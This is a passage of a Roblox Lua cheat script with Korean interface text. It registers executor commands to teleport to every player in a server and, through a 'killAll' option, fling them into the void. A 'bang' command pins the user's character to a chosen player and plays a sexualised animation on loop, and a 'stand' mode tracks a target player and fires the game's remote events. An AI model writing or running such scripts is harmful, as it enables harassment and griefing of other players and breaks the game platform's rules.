					local v7 = createTextBox(loop, tbl6.loopDelay, 148, loop2 + 58, 72, 22)

					createTextButton(loop, "✔ 적용", 10, loop2 + 92, 205, 28, Color3.fromRGB(40, 170, 80)).MouseButton1Click:Connect(function()
						tbl6.loopCount = tonumber(v6.Text) or tbl6.loopCount
						tbl6.loopDelay = tonumber(v7.Text) or tbl6.loopDelay
						loop:Destroy()
						tbl7.loop = nil
					end)
				end
			end)
		end

		local frame4 = Instance.new("Frame", frame2)
		frame4.Size = UDim2.new(1, -20, 0, 1)
		frame4.Position = UDim2.new(0, 10, 0, 130)
		frame4.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
		frame4.BorderSizePixel = 0
		local v3 = createTextLabel(frame2, "대기 중...", 10, 140, 250, 22, Color3.fromRGB(130, 130, 160), 12)
		local v4 = createTextLabel(frame2, "", 10, 162, 250, 20, Color3.fromRGB(100, 220, 100), 12)
		local frame5 = Instance.new("Frame", frame2)
		frame5.Size = UDim2.new(1, -20, 0, 1)
		frame5.Position = UDim2.new(0, 10, 0, 190)
		frame5.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
		frame5.BorderSizePixel = 0
		local v5 = createTextButton(frame2, "▶  실행", 10, 200, 250, 46, Color3.fromRGB(40, 160, 80))
		v5.TextSize = 16
		local v6 = createTextLabel(frame2, "", 10, 252, 250, 20, Color3.fromRGB(180, 180, 100), 12)
		local v7 = createTextLabel(frame2, "", 10, 274, 250, 20, Color3.fromRGB(100, 100, 130), 11)

		local function getHwid4()
			local localPlayer3 = Players_2.LocalPlayer
			local character = localPlayer3.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			local tbl8 = {}

			for _, player in pairs(Players_2:GetPlayers()) do
				local flag3 = tbl6.excludeSelf and player == localPlayer3
				local rangeFilter = tbl6.rangeFilter and character
				local flag4 = false

				if rangeFilter then
					local character2 = player.Character
					character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

					if character2 and (character.Position - character2.Position).Magnitude > tbl6.maxRange then
						flag4 = true
					end
				end

				if not flag3 and not flag4 then
					table.insert(tbl8, player)
				end
			end

			if tbl6.randomOrder then
				for i = #tbl8, 2, -1 do
					local n = math.random(1, i)
					local v8 = tbl8[i]
					tbl8[i] = tbl8[n]
					tbl8[n] = v8
				end
			end

			return tbl8
		end

		local function fn5(arg)
			local ox = tbl6.ox
			local oy = tbl6.oy
			local oz = tbl6.oz

			if tbl6.tpDir == "behind" then
				oz += 2
			elseif tbl6.tpDir == "front" then
				oz -= 2
			elseif tbl6.tpDir == "side" then
				ox += 2
			end

			if tbl6.accuracy then
				return arg.CFrame * CFrame.new(0, 0, 0) * CFrame.new(ox, oy, oz)
			end
			return arg.CFrame * CFrame.new(ox, oy, oz)
		end

		v5.MouseButton1Click:Connect(function()
			if getgenv().TpaRunning then
				getgenv().TpaRunning = false
				local character = localPlayer2.Character
				character = character and character:FindFirstChild("HumanoidRootPart")

				if character then
					setPhysicsRep(character, nil)
				end

				v5.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
				v5.Text = "▶  실행"
				v3.Text = "취소됨."
				return
			end

			getgenv().TpaRunning = true
			v5.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
			v5.Text = "■  취소"

			task.spawn(function()
				local localPlayer3 = Players_2.LocalPlayer
				local now = tick()
				local n = 0

				while true do
					n += 1

					if tbl6.loopMode then
						v6.Text = string.format("루프 %d / %s 회", n, tbl6.loopCount == 0 and "∞" or tostring(tbl6.loopCount))
					end

					local hwid = getHwid4()
					local n2 = #hwid
					local n3 = 0

					for _, v8 in pairs(hwid) do
						if getgenv().TpaRunning then
							local character = localPlayer3.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								local character2 = v8.Character
								character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

								if character2 then
									if tbl6.notifyEach then
										notify("Teleport All", v8.Name .. " 에게 이동", 1)
									end

									local delay = tbl6.delay > 0 and tbl6.delay or 0.1

									if tbl6.accuracy then
										local connection = RunService_2.Heartbeat:Connect(function()
											local character3 = localPlayer3.Character
											character3 = character3 and character3:FindFirstChild("HumanoidRootPart")
											local character4 = v8.Character
											character4 = character4 and character4:FindFirstChild("HumanoidRootPart")

											if character3 and character4 then
												setPhysicsRep(character3, character4)
												character3.CFrame = fn5(character4)
											end
										end)

										task.wait(delay)

										if connection then
											connection:Disconnect()
										end

										setPhysicsRep(character, nil)
									else
										character.CFrame = fn5(character2)
										task.wait(delay)
									end

									if tbl6.killAll and getgenv().TpaRunning then
										local voidDelay = tbl6.voidDelay > 0 and tbl6.voidDelay or 0.5
										v3.Text = v8.Name .. " 공허 대기 중 (" .. tostring(voidDelay) .. "초)..."
										task.wait(voidDelay)

										if getgenv().TpaRunning then
											character.CFrame = createPart(tbl6.voidY).CFrame + Vector3.new(0, 5, 0)
											task.wait(0.1)
											local character3 = v8.Character
											local humanoidRootPart = character3 and character3:FindFirstChild("HumanoidRootPart")

											if humanoidRootPart then
												humanoidRootPart.CFrame = CFrame.new(0, tbl6.voidY - 200, 0)
											end

											task.wait(0.2)
										end
									end
								end

								n3 += 1
								v4.Text = string.format("%d / %d 완료", n3, n2)
								v3.Text = n3 < n2 and "이동 중..." or "이동 완료!"
								continue
							end
						end

						break
					end

					if getgenv().TpaRunning then
						local flag3

						if tbl6.loopMode then
							local loopCount = tbl6.loopCount

							if loopCount <= 0 or n < loopCount then
								v3.Text = string.format("루프 %d / %.1f초 후 재시작...", n, tbl6.loopDelay)
								task.wait(tbl6.loopDelay)
								flag3 = not tbl6.loopMode or not getgenv().TpaRunning
								if not flag3 then
									continue
								end
							end
						else
							flag3 = not tbl6.loopMode or not getgenv().TpaRunning
							if not flag3 then
								continue
							end
						end
					end

					break
				end

				local character = localPlayer3.Character
				character = character and character:FindFirstChild("HumanoidRootPart")

				if character then
					setPhysicsRep(character, nil)
				end

				local text = string.format("%.1f초 소요", tick() - now)
				v7.Text = text
				v6.Text = tbl6.loopMode and string.format("총 %d 루프 완료", n) or ""

				if getgenv().TpaRunning then
					v3.Text = "모두 완료! " .. text
				end

				getgenv().TpaRunning = false
				v5.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
				v5.Text = "▶  실행"
			end)
		end)
	end)

	addcmd("unteleportallgui", { "untpa" }, function()
		getgenv().TpaRunning = false

		if getgenv().delvape then
			getgenv().delvape("teleportallgui")
		end

		if v then
			v:Destroy()
		end

		notify("Teleport All", "꺼졌습니다 ❌", 2)
	end)

	local animation = nil
	local v2 = nil
	local connection = nil
	local connection2 = nil
	local connection3 = nil

	addcmd("unbang", { "unbang" }, function(arg, arg2)
		if getgenv().delvape then
			getgenv().delvape("bang")
		end

		if connection3 then
			pcall(function()
				connection3:Disconnect()
			end)

			connection3 = nil
		end

		if v2 then
			pcall(function()
				v2:Stop()
			end)

			v2 = nil
		end

		if animation then
			pcall(function()
				animation:Destroy()
			end)

			animation = nil
		end

		if connection2 then
			pcall(function()
				connection2:Disconnect()
			end)

			connection2 = nil
		end

		if connection then
			pcall(function()
				connection:Disconnect()
			end)

			connection = nil
		end

		local character = arg2.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

		if humanoidRootPart then
			setPhysicsRep(humanoidRootPart, nil)
		end

		notify("Bang", "뱅 중지됨", 2)
	end)

	addcmd("bang", { "bang" }, function(arg, arg2)
		execCmd("unbang", arg2)
		task.wait(0.1)
		local character = arg2.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not humanoidRootPart then
			return
		end

		if getgenv().addvape then
			getgenv().addvape("bang")
		end

		animation = Instance.new("Animation")
		animation.AnimationId = not r15(arg2) and "rbxassetid://148840371" or "rbxassetid://5918726674"
		v2 = humanoid:LoadAnimation(animation)

		pcall(function()
			v2.Priority = Enum.AnimationPriority.Action4
		end)

		pcall(function()
			if v2.Priority ~= Enum.AnimationPriority.Action4 then
				v2.Priority = Enum.AnimationPriority.Action
			end
		end)

		v2:Play(0.1, 1, 1)
		v2:AdjustSpeed(tonumber(arg[2]) or 3)

		connection3 = v2.Stopped:Connect(function()
			if connection and v2 then
				pcall(function()
					v2:Play(0.1, 1, 1)
					v2:AdjustSpeed(tonumber(arg[2]) or 3)
				end)
			end
		end)

		connection2 = humanoid.Died:Connect(function()
			execCmd("unbang", arg2)
		end)

		if arg[1] then
			local v3 = getPlayer(arg[1], arg2)

			if v3 and #v3 > 0 then
				local v4 = Players_2:FindFirstChild(v3[1])

				if v4 and v4.Character then
					if v4.Character:FindFirstChild("HumanoidRootPart") or getRoot(v4.Character) then
						local cframe = CFrame.new(0, 0, 2.5)

						connection = RunService_2.Heartbeat:Connect(function()
							local character2 = arg2.Character
							character2 = character2 and character2:FindFirstChild("HumanoidRootPart")
							local character3 = v4.Character

							if character3 then
								character3 = character3:FindFirstChild("HumanoidRootPart") or getRoot(character3)
							end

							if character2 and character3 then
								setPhysicsRep(character2, character3)
								character2.CFrame = character3.CFrame * cframe
							end
						end)

						notify("Bang", v4.Name .. " 에게 뱅 시작", 2)
					else
						notify("오류", "대상을 찾을 수 없습니다.", 2)
					end
				else
					notify("오류", "대상을 찾을 수 없습니다.", 2)
				end
			end
		else
			notify("Bang", "뱅 모션 시작됨", 2)
		end
	end)

	local flag2 = false
	local v3 = nil
	local flag3 = true
	local cframe = CFrame.new(-2, 2, 5)
	local cframe2 = CFrame.new(0, 0, -4)
	local v4 = cframe
	local tbl6 = { 0, 0, 0, 0 }
	local n = 0
	local n2 = 0
	local n3 = 0
	local n4 = 0
	local connection4 = nil
	local v5 = nil
	local connection5 = nil
	local connection6 = nil
	local connection7 = nil
	local connection8 = nil
	local connection9 = nil
	local connection10 = nil
	local connection11 = nil

	local function fn3()
	end

	local tbl7 = {
		{ "Normal Punch", 10468665991, 20, 1, "Normal Punch" },
		{ "Consecutive Punches", 10466974800, 15, 2, "Consecutive Punches" },
		{ "Shove", 10471336737, 10, 3, "Shove" },
		{ "Uppercut", 12510170988, 20, 4, "Uppercut" },
		{ "Table Flip", 11365563255, 20, 2, "Table Flip" },
		{ "Serious Punch", 12983333733, 20, 3, "Serious Punch" },
		{ "Omni Directional Punch", 13927612951, 20, 4, "Omni Directional Punch" },
		{ "Lethal Whirlwind Stream", 12296882427, 20, 2, "Lethal Whirlwind Stream" },
		{ "Flowing Water", 12272894215, 17.5, 1, "Flowing Water" },
		{ "Hunters Grasp", 12307656616, 15, 3, "Hunter's Grasp" },
		{ "Preys Peril", 12351854556, 17, 4, "Prey's Peril" },
		{ "Water Stream Cutting Fist", 12460977270, 8.45, 1, "Water Stream Cutting Fist" },
		{ "The Final Hunt", 12463072679, 101, 2, "The Final Hunt" },
		{ "Rock Splitting Fist", 14057231976, 14, 3, "Rock Splitting Fist" },
		{ "Crushed Rock", 13630786846, 9.58, 4, "Crushed Rock" },
		{ "Machine Gun Blows", 12534735382, 15, 1, "Machine Gun Blows" },
		{ "Ignition Burst", 12502664044, 17.5, 2, "Ignition Burst" },
		{ "Blitz Shot", 12618271998, 25, 3, "Blitz Shot" },
		{ "Jet Dive", 12684390285, 17.5, 4, "Jet Dive" },
		{ "Thunder Kick", 14721837245, 15, 1, "Thunder Kick" },
		{ "Speedblitz Dropkick", 12832505612, 20, 2, "Speedblitz Dropkick" },
		{ "Flamewave Cannon", 13083332742, 25, 3, "Flamewave Cannon" },
		{ "Incinerate", 13146710762, 101, 4, "Incinerate" },
		{ "Flash Strike", 13309500827, 17.5, 1, "Flash Strike" },
		{ "Whirlwind Kick", 13294790250, 20, 2, "Whirlwind Kick" },
		{ "Scatter", 13362587853, 21.25, 3, "Scatter" },
		{ "Explosive Shuriken", 13501296372, 17.5, 4, "Explosive Shuriken" },
		{ "Twinblade Rush", 13632347366, 20, 1, "Twinblade Rush" },
		{ "Straight On", 13643152947, 17, 2, "Straight On" },
		{ "Carnage", 13723174078, 25, 3, "Carnage" },
		{ "Fourfold Flashstrike", 13881335713, 25, 4, "Fourfold Flashstrike" },
		{ "Homerun", 14004235777, 17.5, 1, "Homerun" },
		{ "Grand Slam", 14299135500, 20, 3, "Grand Slam" },
		{ "Foul Ball", 14351441234, 23, 4, "Foul Ball" },
		{ "Savage Tornado", 14719290328, 17, 1, "Savage Tornado" },
		{ "Brutal Beatdown", 14701242661, 30, 2, "Brutal Beatdown" },
		{ "Strength Difference", 14900168720, 20, 3, "Strength Difference" },
		{ "Death Blow", 15128849047, 101, 4, "Death Blow" },
		{ "Quick Slice", 15290930205, 20, 1, "Quick Slice" },
		{ "Atmos Cleave", 15145462680, 22, 2, "Atmos Cleave" },
		{ "Pinpoint Cut", 15295895753, 17, 3, "Pinpoint Cut" },
		{ "Pinpoint Cut", 15295336270, 17, 3, "Pinpoint Cut" },
		{ "Split Second Counter", 15311685628, 17.5, 4, "Split Second Counter" },
		{ "Sunset", 15520132233, 15, 1, "Sunset" },
		{ "Solar Cleave", 15676072469, 15, 2, "Solar Cleave" },
		{ "Sunrise", 16062410809, 20, 3, "Sunrise" },
		{ "Atomic Slash", 16082123712, 101, 4, "Atomic Slash" },
		{ "Crushing Pull", 16139108718, 21, 1, "Crushing Pull" },
		{ "Windstorm Fury", 16515850153, 20, 2, "Windstorm Fury" },
		{ "Stone Coffin", 16431491215, 25, 3, "Stone Coffin" },
		{ "Expulsive Push", 16597322398, 19, 4, "Expulsive Push" },
		{ "Cosmic Strike", 16737255386, 30, 1, "Cosmic Strike" },
		{ "Psychic Ricochet", 17464644182, 15, 2, "Psychic Ricochet" },
		{ "Terrible Tornado", 17275150809, 101, 3, "Terrible Tornado" },
		{ "Sky Snatcher", 17860467628, 17, 4, "Sky Snatcher" },
		{ "Bullet Barrage", 17799224866, 20, 1, "Bullet Barrage" },
		{ "Vanishing Kick", 17838006839, 23, 2, "Vanishing Kick" },
		{ "Whirlwind Drop", 17857788598, 15, 3, "Whirlwind Drop" },
		{ "Head First", 18179181663, 20, 4, "Head First" },
		{ "Grand Fissure", 129651400898906, 18, 1, "Grand Fissure" },
		{ "Twin Fangs", 18896229321, 15, 2, "Twin Fangs" },
		{ "Earth Splitting Strike", 18897119503, 30, 3, "Earth Splitting Strike" },
		{ "Last Breath", 106755459092436, 101, 4, "Last Breath" },
		{ "Ravage", 16945573694, 17.5, 1, "Ravage" },
		{ "Swift Sweep", 16944265635, 15, 2, "Swift Sweep" },
		{ "Collateral Ruin", 17325254223, 22.5, 3, "Collateral Ruin" },
		{ "Spiraling Storm", 78521642007560, 22.5, 4, "Spiraling Storm" },
		{ "Stoic Bomb", 17141153099, 15, 1, "Stoic Bomb" },
		{ "202020 Dropkick", 17354976067, 101, 2, "20-20-20 Dropkick" },
		{ "Five Seasons", 18462892217, 100, 3, "Five Seasons" },
		{ "Unlimited Flex Works", 77727115892579, 0, 4, "Unlimited Flex Works" },
		{ "Permafrost", 100558589307006, 20, 1, "Permafrost" },
		{ "Frost Forge", 137561511768861, 15, 2, "Frost Forge" },
		{ "Freezing Path", 112620365240235, 25, 3, "Freezing Path" },
		{ "Judgement Chain", 75547590335774, 20, 4, "Judgement Chain" },
		{ "Weboom", 113166426814229, 20, 1, "Weboom" },
		{ "Trinity Tear", 77509627104305, 25, 2, "Trinity Tear" },
		{ "Plasma Cannon", 116753755471636, 20, 3, "Plasma Cannon" },
		{ "Double Trouble", 138443750790136, 20, 4, "Double Trouble" },
		{ "Doom Dive", 101588604872680, 23, 1, "Doom Dive" },
		{ "Crowd Buster", 105442749844047, 22, 2, "Crowd Buster" },
		{ "Hammer Heel", 109617620932970, 18, 3, "Hammer Heel" },
		{ "Binding Cloth", 125955606488863, 20, 4, "Binding Cloth" },
		{ "Hammer Heel", 135289891173395, 18, 3, "Hammer Heel" },
		{ "Machine Gun Blows", 12971270638, 15, 1, "Machine Gun Blows" },
		{ "Crushed Rock", 72451715583225, 9.58, 4, "Crushed Rock" },
		{ "Block", 13380778193, 0, 0, "Block" },
		{ "Block", 13370310513, 0, 0, "Block" },
		{ "Block", 13935548552, 0, 0, "Block" },
	}

	local function fn4()
		local character = localPlayer.Character
		if not character then
			return
		end

		for _, descendant in pairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.CanCollide = false
			end
		end
	end

	local tbl8 = {}

	local function fn5()
		if not v3 or not v3.Character then
			return
		end

		if not localPlayer.Character then
			return
		end
		local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
		local humanoidRootPart2 = v3.Character:FindFirstChild("HumanoidRootPart")
		if not humanoidRootPart or not humanoidRootPart2 then
			return
		end
		tbl8 = {}

		for _, descendant in pairs(localPlayer.Character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				tbl8[descendant] = { CanCollide = descendant.CanCollide, Massless = descendant.Massless }
				descendant.CanCollide = false
				descendant.Massless = true
			end
		end

		local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

		if humanoid then
			pcall(function()
				humanoid.AutoRotate = false
			end)

			humanoid.PlatformStand = true
		end

		humanoidRootPart.CFrame = humanoidRootPart2.CFrame * v4
		humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		setPhysicsRep(humanoidRootPart, humanoidRootPart2)
	end

	local function fn6(arg)
		v4 = arg
	end

	local tbl9 = {}

	local function fn7()
		for _, v6 in pairs(tbl9) do
			pcall(function()
				v6:Disconnect()
			end)
		end

		tbl9 = {}
	end

	local tbl10 = {
		{
			id = "16136144568",
			name = "Idle 1",
			tpos = 0.69,
			free = true,
			oscillate = true,
			tposMin = 0.45,
			tposMax = 0.7,
			speed = 0.1,
		},
		{ id = "17861840167", name = "Idle 2", tpos = 1, free = false, oscillate = false },
		{ id = "16524522673", name = "Idle 3", tpos = 0.71, free = false, oscillate = false },
		{ id = "15099756132", name = "Idle 4", tpos = 0, free = true, oscillate = false },
	}

	local function fn8(arg)
		if not flag2 or not flag3 then
			return
		end
		local now = tick()
		if v5 and v5.IsPlaying and now - n3 < 0.1 then
			return
		end
		n3 = now
		local character = localPlayer.Character
		local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
		humanoid = humanoid and humanoid:FindFirstChildWhichIsA("Animator")
		if not humanoid then
			return
		end
		local v6 = nil
		arg = arg or "Random"

		if arg ~= "Random" then
			for _, v7 in ipairs(tbl10) do
				if v7.name == arg then
					v6 = v7
					break
				end
			end
		end

		if not v6 then
			local n5

			repeat
				n5 = math.random(1, #tbl10)
			until n5 ~= n4

			n4 = n5
			v6 = tbl10[n5]
		end

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		if v5 then
			pcall(function()
				v5:Stop(0)
			end)

			v5 = nil
		end

		local animation2 = Instance.new("Animation")
		animation2.AnimationId = "rbxassetid://" .. v6.id
		local v7 = humanoid:LoadAnimation(animation2)

		pcall(function()
			v7.Priority = Enum.AnimationPriority.Action4
		end)

		v7.Looped = true
		v5 = v7

		if v6.free then
			v7:Play()
			v7:AdjustWeight(1)

			if v6.oscillate then
				v7.TimePosition = v6.tpos
				v7:AdjustSpeed(-(v6.speed or 0.1))
			elseif v6.tpos then
				v7.TimePosition = v6.tpos
			end

			connection4 = RunService_2.RenderStepped:Connect(function()
				if not flag2 then
					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					pcall(function()
						v7:Stop(0)
					end)

					v5 = nil
					return
				end

				if n2 > 0 then
					if v7.IsPlaying then
						pcall(function()
							v7:Stop(0)
						end)
					end

					return
				end

				if not v7.IsPlaying then
					return
				end
				v7:AdjustWeight(1)

				if v6.freezeAt and v7.TimePosition >= v6.freezeAt then
					v7:AdjustSpeed(0)
					v7.TimePosition = v6.freezeAt
				elseif v6.oscillate then
					local speed = v6.speed or 0.1

					if v6.tposMax <= v7.TimePosition then
						v7:AdjustSpeed(-speed)
					elseif v7.TimePosition <= v6.tposMin then
						v7:AdjustSpeed(speed)
					end
				end
			end)
		else
			v7:Play()
			v7:AdjustSpeed(0)
			v7:AdjustWeight(1)
			v7.TimePosition = v6.tpos

			connection4 = RunService_2.RenderStepped:Connect(function()
				if not flag2 then
					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					pcall(function()
						v7:Stop(0)
					end)

					v5 = nil
					return
				end

				if n2 > 0 then
					if v7.IsPlaying then
						pcall(function()
							v7:Stop(0)
						end)
					end

					return
				end

				if not v7.IsPlaying then
					return
				end
				v7:AdjustSpeed(0)
				v7:AdjustWeight(1)
				v7.TimePosition = v6.tpos
			end)
		end
	end

	local function fn9()
		n2 = 0
		n3 = 0

		if connection4 then
			connection4:Disconnect()
			connection4 = nil
		end

		if v5 then
			pcall(function()
				v5:Stop(0)
			end)

			v5 = nil
		end

		if connection5 then
			connection5:Disconnect()
			connection5 = nil
		end

		if connection6 then
			connection6:Disconnect()
			connection6 = nil
		end

		if connection7 then
			connection7:Disconnect()
			connection7 = nil
		end

		if connection8 then
			connection8:Disconnect()
			connection8 = nil
		end

		if connection9 then
			connection9:Disconnect()
			connection9 = nil
		end

		if connection10 then
			connection10:Disconnect()
			connection10 = nil
		end

		fn7()

		pcall(function()
			if localPlayer.Character then
				local humanoid = localPlayer.Character:FindFirstChildWhichIsA("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false

					pcall(function()
						humanoid.AutoRotate = true
					end)
				end

				local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
					humanoidRootPart.AssemblyAngularVelocity = Vector3.zero

					pcall(function()
						humanoidRootPart.Velocity = Vector3.zero
					end)

					pcall(function()
						humanoidRootPart.RotVelocity = Vector3.zero
					end)

					setPhysicsRep(humanoidRootPart, nil)
				end

				for k, v6 in pairs(tbl8) do
					if k and k.Parent then
						k.CanCollide = v6.CanCollide
						k.Massless = v6.Massless
					end
				end

				tbl8 = {}
			end
		end)

		tbl6 = { 0, 0, 0, 0 }
	end

	local function fn10()
		flag3 = not flag3

		if flag3 then
			fn3()
		else
			if connection5 then
				connection5:Disconnect()
				connection5 = nil
			end

			if connection6 then
				connection6:Disconnect()
				connection6 = nil
			end

			pcall(function()
				local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					humanoid.PlatformStand = false
				end
			end)
		end
	end

	local function fn11(arg)
		local character = arg.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")
		if not humanoid then
			return
		end

		if connection7 then
			connection7:Disconnect()
			connection7 = nil
		end

		connection7 = humanoid.AnimationPlayed:Connect(function(arg2)
			local animationId = arg2.Animation and arg2.Animation.AnimationId or ""

			if animationId:match("10470389827") or animationId:match("13380778193") or animationId:match("13370310513") or animationId:match("13935548552") then
				n += 1

				if n >= 3 then
					n = 0
					fn10()
				end

				task.delay(1, function()
					if n > 0 then
						n -= 1
					end
				end)

				return
			end

			for _, v6 in pairs(tbl7) do
				if animationId ~= "rbxassetid://" .. tostring(v6[2]) then
					continue
				else
					local v7 = v6[4]

					if v7 ~= 0 then
						tbl6[v7] = v6[3]

						task.spawn(function()
							task.wait(v6[3])
							tbl6[v7] = 0
						end)

						continue
					end
				end

				break
			end
		end)

		fn7()

		for _, v6 in pairs(tbl7) do
			local str = "Holding" .. string.gsub(v6[1], " ", "")

			pcall(function()
				character:SetAttribute(str, false)
			end)

			local connection12 = character:GetAttributeChangedSignal(str):Connect(function()
				if character:GetAttribute(str) == true and tbl6[v6[4]] ~= 0 then
					for _, v7 in pairs(tbl7) do
						if v7[4] == v6[4] and localPlayer.Backpack:FindFirstChild(v7[5]) then
							pcall(function()
								localPlayer.Character.Communicate:FireServer(unpack({ { Tool = localPlayer.Backpack:WaitForChild(v7[5]), Goal = "Console Move" } }))
							end)
						end
					end
				end
			end)

			table.insert(tbl9, connection12)
		end
	end

	local function fn12()
		if connection9 then
			connection9:Disconnect()
			connection9 = nil
		end

		local character = localPlayer.Character
		if not character then
			return
		end
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")
		local animator = humanoid and humanoid:FindFirstChildWhichIsA("Animator")
		if not humanoid then
			return
		end

		local function fn13(arg)
			local str = (arg.Animation and arg.Animation.AnimationId or ""):gsub("%s+", "")

			for _, v6 in pairs(tbl7) do
				if str == "rbxassetid://" .. tostring(v6[2]) then
					if v6[4] ~= 0 then
						fn6(cframe2)

						task.spawn(function()
							if connection6 then
								connection6:Disconnect()
								connection6 = nil
							end

							local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
							local cFrame = not flag3 and humanoidRootPart and humanoidRootPart.CFrame
							n2 += 1

							pcall(function()
								local humanoid2 = localPlayer.Character and localPlayer.Character:FindFirstChildWhichIsA("Humanoid")

								if humanoid2 then
									humanoid2.PlatformStand = false
								end
							end)

							connection6 = RunService_2.Heartbeat:Connect(function()
								local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
								local humanoidRootPart3 = v3 and v3.Character and v3.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart2 and humanoidRootPart3 then
									humanoidRootPart2.CFrame = humanoidRootPart3.CFrame * cframe2
									humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
									humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
									setPhysicsRep(humanoidRootPart2, humanoidRootPart3)
								end
							end)

							arg.Stopped:Wait()

							if connection6 then
								connection6:Disconnect()
								connection6 = nil
							end

							n2 = math.max(0, n2 - 1)
							if n2 > 0 then
								return
							end
							fn6(cframe)

							if flag3 then
								n3 = 0
							else
								local humanoidRootPart2 = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")

								if humanoidRootPart2 and cFrame then
									humanoidRootPart2.CFrame = cFrame
									humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
									humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
								end
							end
						end)
					end

					break
				end
			end
		end

		connection9 = humanoid.AnimationPlayed:Connect(fn13)

		if animator then
			local connection12 = animator.AnimationPlayed:Connect(fn13)
			local v6 = connection9

			connection9 = { Disconnect = function()
				pcall(function()
					v6:Disconnect()
				end)

				pcall(function()
					connection12:Disconnect()
				end)
			end }
		end
	end

	fn3 = function()
		if connection5 then
			connection5:Disconnect()
			connection5 = nil
		end

		connection5 = RunService_2.Heartbeat:Connect(function()
			if not flag2 or n2 > 0 then
				return
			end

			if not v3 or not v3.Character then
				return
			end

			if not localPlayer.Character then
				return
			end
			local humanoidRootPart = localPlayer.Character:FindFirstChild("HumanoidRootPart")
			local humanoidRootPart2 = v3.Character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart or not humanoidRootPart2 then
				return
			end
			local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.AutoRotate = false
				end)

				if flag3 then
					humanoid.PlatformStand = true
				end
			end

			if flag3 then
				fn4()
				humanoidRootPart.CFrame = humanoidRootPart2.CFrame * v4
				humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
				humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
				setPhysicsRep(humanoidRootPart, humanoidRootPart2)
				local flag4

				if not v5 then
					flag4 = true
				else
					local ok, result = pcall(function()
						return v5.IsPlaying
					end)

					flag4 = not ok or not result
				end

				if flag4 then
					local now = tick()

					if now - n3 >= 1 then
						n3 = now
						task.defer(fn8)
					end
				end
			end
		end)
	end

	local fn13 = nil

	fn13 = function(arg)
		fn9()
		flag2 = true
		v3 = arg
		v4 = cframe

		if not arg.Character then
			connection8 = arg.CharacterAdded:Connect(function(character)
				local humanoid = character:WaitForChild("Humanoid", 10)
				if not humanoid then
					return
				end
				humanoid:WaitForChild("Animator", 10)
				fn13(arg)
			end)

			return
		end

		fn5()
		fn11(arg)
		fn12()
		fn3()
		task.defer(fn8)

		connection8 = arg.CharacterAdded:Connect(function(character)
			local humanoid = character:WaitForChild("Humanoid", 10)
			if not humanoid then
				return
			end
			humanoid:WaitForChild("Animator", 10)

			if flag2 then
				fn13(arg)
			end
		end)

		if connection10 then
			connection10:Disconnect()
		end

		connection10 = Players_2.PlayerRemoving:Connect(function(player)
			if player == arg then
				_standDeactivate()
				notify("Stand", "타겟 플레이어가 게임을 나갔습니다.", 2)
			end
		end)

		if connection11 then
			connection11:Disconnect()
		end

		connection11 = localPlayer.CharacterAdded:Connect(function(character)
			local humanoid = character:WaitForChild("Humanoid", 10)
			if not humanoid then
				return
			end
			humanoid:WaitForChild("Animator", 10)
			if not flag2 then
				return
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			if v5 then
				pcall(function()
					v5:Stop(0)
				end)

				v5 = nil
			end

			n3 = 0
			fn5()
			fn12()

			if flag3 then
				task.defer(fn8)
			end
		end)
	end

	local function fn14()
		flag2 = false
		fn9()

		if connection11 then
			connection11:Disconnect()
			connection11 = nil
		end
	end

	local v6 = nil

	local function fn15()
		if v6 then
			v6:Destroy()
			v6 = nil
		end

		fn14()
	end

	addcmd("unstandgui", { "unstand" }, function()
		if getgenv().delvape then
			getgenv().delvape("standgui")
		end

		fn15()
		notify("Stand", "스탠드 기능이 꺼졌습니다 ❌", 2)
	end)

	addcmd("standgui", { "stand" }, function(arg, arg2)
		if getgenv().addvape then
			getgenv().addvape("standgui")
		end

		fn15()
		local screenGui3 = Instance.new("ScreenGui")
		screenGui3.Name = "UnknownStandGUI"
		screenGui3.ResetOnSpawn = false
		screenGui3.Parent = localPlayer:WaitForChild("PlayerGui")
		v6 = screenGui3
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.Size = UDim2.new(0, 240, 0, 310)
